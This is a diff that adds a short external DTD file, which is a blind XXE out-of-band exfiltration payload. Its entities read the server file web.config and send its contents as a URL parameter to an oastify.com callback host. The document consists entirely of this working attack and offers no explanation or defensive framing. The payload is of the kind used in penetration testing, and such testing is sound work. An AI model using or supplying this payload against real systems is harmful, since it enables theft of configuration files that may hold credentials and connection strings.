@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///web.config">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://lshdhoauxs6q1n4vpc27ergeh5nybn.oastify.com/?x=%file;'>">
+%eval;
+%exfiltrate;
